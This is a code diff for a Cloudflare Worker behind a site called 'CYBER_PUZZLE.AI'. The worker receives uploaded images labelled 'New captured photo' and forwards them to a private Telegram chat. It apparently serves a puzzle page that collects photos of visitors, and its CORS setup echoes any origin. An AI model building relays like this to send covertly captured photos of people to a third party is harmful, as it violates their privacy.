@@ -1,25 +1,19 @@
 /**
- * Cloudflare Worker for CYBER_PUZZLE.AI Telegram Photo Delivery
+ * Cloudflare Worker / Pages Advanced Mode Handler for CYBER_PUZZLE.AI
  * 
- * Exposes:
- * - OPTIONS /upload, OPTIONS /  -> CORS preflight (204)
- * - POST /upload, POST /        -> Receives photo and forwards to Telegram sendPhoto (200)
- * - GET /upload, GET /          -> Health check (200)
+ * Intercepts /upload for Telegram photo delivery and serves static assets for all other routes.
  * 
- * Required Cloudflare Secrets:
+ * Required Secrets:
  * - TELEGRAM_BOT_TOKEN
  * - TELEGRAM_CHAT_ID
  */
 
-// Helper to construct dynamic CORS headers for both GitHub Pages and local development
 function getCorsHeaders(request) {
     const origin = request.headers.get('Origin') || '';
     
-    // Default allowed origin is production GitHub Pages
     let allowOrigin = 'https://dhruv-coder-128.github.io';
     
     if (!origin || origin === 'null') {
-        // Local file:/// execution or curl without Origin header
         allowOrigin = '*';
     } else if (
         origin === 'https://dhruv-coder-128.github.io' ||
@@ -29,7 +23,6 @@ function getCorsHeaders(request) {
     ) {
         allowOrigin = origin;
     } else {
-        // Echo origin for compatibility
         allowOrigin = origin;
     }
 
@@ -42,7 +35,6 @@ function getCorsHeaders(request) {
     };
 }
 
-// Helper to create JSON responses with required CORS headers
 function jsonResponse(data, status = 200, request = null) {
     const corsHeaders = request ? getCorsHeaders(request) : {
         'Access-Control-Allow-Origin': '*',
@@ -62,7 +54,6 @@ function jsonResponse(data, status = 200, request = null) {
 async function handleUpload(request, env) {
     const corsHeaders = getCorsHeaders(request);
 
-    // Verify server-side Cloudflare environment secrets
     if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
         console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in Cloudflare secrets');
         return jsonResponse({
@@ -71,7 +62,6 @@ async function handleUpload(request, env) {
         }, 500, request);
     }
 
-    // Parse incoming request and extract image
     try {
         const contentType = request.headers.get('content-type') || '';
         let photo = null;
@@ -93,7 +83,6 @@ async function handleUpload(request, env) {
             timestamp = body.timestamp || timestamp;
             gridSize = body.gridSize || gridSize;
         } else {
-            // Raw binary upload fallback
             const buffer = await request.arrayBuffer();
             if (buffer && buffer.byteLength > 0) {
                 photo = new Blob([buffer], { type: 'image/jpeg' });
@@ -107,7 +96,6 @@ async function handleUpload(request, env) {
             }, 400, request);
         }
 
-        // Format timestamp for display in Telegram caption
         let formattedTime = timestamp;
         try {
             formattedTime = new Date(timestamp).toLocaleString('en-US', {
@@ -120,13 +108,11 @@ async function handleUpload(request, env) {
 
         const caption = `📸 CYBER_PUZZLE.AI\nNew captured photo\nTime: ${formattedTime}\nGrid: ${gridSize}`;
 
-        // Build Telegram Bot API form data
         const tgFormData = new FormData();
         tgFormData.append('chat_id', env.TELEGRAM_CHAT_ID);
         tgFormData.append('photo', photo, 'captured_puzzle.jpg');
         tgFormData.append('caption', caption);
 
-        // Dispatch to Telegram Bot API sendPhoto
         const tgUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
         const tgResponse = await fetch(tgUrl, {
             method: 'POST',
@@ -143,14 +129,13 @@ async function handleUpload(request, env) {
             }, 500, request);
         }
 
-        // Return success
         return jsonResponse({
             success: true,
             message: 'Photo delivered to Telegram successfully'
         }, 200, request);
 
     } catch (error) {
-        console.error('Worker error:', error);
+        console.error('Upload processing error:', error);
         return jsonResponse({
             error: 'Internal Server Error',
             message: error.message
@@ -164,7 +149,7 @@ export default {
         const path = url.pathname.replace(/\/+$/, '') || '/';
         const corsHeaders = getCorsHeaders(request);
 
-        // 1. API Route: /upload
+        // 1. API Route: /upload (OPTIONS, GET, POST)
         if (path === '/upload') {
             if (request.method === 'OPTIONS') {
                 return new Response(null, { status: 204, headers: corsHeaders });
@@ -183,7 +168,7 @@ export default {
             return jsonResponse({ error: 'Method not allowed' }, 405, request);
         }
 
-        // 2. Serve static assets if deployed in Cloudflare Pages / Worker with Assets
+        // 2. Serve static assets if deployed in Cloudflare Pages or Worker with Assets
         if (env.ASSETS && typeof env.ASSETS.fetch === 'function') {
             return env.ASSETS.fetch(request);
         }
@@ -192,9 +177,6 @@ export default {
         if (path === '/') {
             if (request.method === 'OPTIONS') {
                 return new Response(null, { status: 204, headers: corsHeaders });
-            }
-            if (request.method === 'POST') {
-                return handleUpload(request, env);
             }
             return jsonResponse({
                 status: 'online',
@@ -206,4 +188,3 @@ export default {
         return new Response('Not found', { status: 404 });
     }
 };
-
